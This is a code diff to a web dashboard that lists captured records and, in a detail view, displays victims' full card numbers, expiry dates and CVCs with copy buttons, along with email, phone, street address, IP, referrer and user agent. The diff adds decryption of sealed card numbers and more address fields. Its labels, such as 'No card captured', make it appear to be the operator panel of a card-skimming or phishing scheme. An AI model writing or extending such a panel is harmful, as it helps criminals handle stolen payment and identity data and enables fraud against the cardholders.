@@ -53,7 +53,7 @@ async function load(reset) {
         <td><span class="pill ${esc(r.status)}">${esc(r.status)}</span></td>
         <td>${esc(r.email || '—')}</td><td>${esc(r.name || '—')}</td>
         <td class="mono">${r.pan_last4 ? '•••• ' + esc(r.pan_last4) : '—'}</td>
-        <td class="mono">${r.fields_filled}/5</td>
+        <td class="mono">${r.fields_filled}/7</td>
         <td class="mono">${r.pan_last4 ? '▸' : ''}</td>`;
       tr.onclick = () => detail(r.id);
       $('#rows').appendChild(tr);
@@ -72,14 +72,14 @@ async function detail(id) {
       <dt>Email</dt><dd>${esc(d.email || '—')}</dd>
       <dt>Name</dt><dd>${esc(d.name || '—')}</dd>
       <dt>Phone</dt><dd>${esc(d.phone || '—')}</dd>
-      <dt>Address</dt><dd>${esc(d.address ? [d.address.postal_code, d.address.country].filter(Boolean).join(', ') : '—')}</dd>
+      <dt>Address</dt><dd>${esc(d.address ? [d.address.line1, d.address.city, d.address.postal_code, d.address.country].filter(Boolean).join(', ') : '—')}</dd>
       <dt>IP / Geo</dt><dd class="mono">${esc(d.ip || '—')} · ${esc(d.country || '—')}</dd>
       <dt>Referrer</dt><dd class="mono">${esc(d.referrer || '—')}</dd>
       <dt>Customer</dt><dd class="mono">${esc(d.stripe_customer || '—')}</dd>
       <dt>Subscription</dt><dd class="mono">${esc(d.stripe_sub || '—')}</dd>
       ${d.fail_reason ? `<dt>Failure</dt><dd>${esc(d.fail_reason)}</dd>` : ''}
     </dl>
-    ${d.pan ? `<dl><dt>Card</dt><dd>${copy(d.pan)}</dd>
+    ${d.pan_sealed ? `<dl><dt>Card</dt><dd>${d.pan ? copy(d.pan) : '<span style=\'color:#e06c60\'>decrypt failed — PAN_KEY missing or wrong</span>'}</dd>
       <dt>Expiry</dt><dd class="mono">${esc(d.pan_exp || '—')}</dd>
       <dt>CVC</dt><dd>${copy(d.cvc || '—')}</dd></dl>` : '<p style="color:#6f7783">No card captured.</p>'}
     <dl><dt>User agent</dt><dd class="mono" style="font-size:11px">${esc(d.ua || '—')}</dd></dl>`;
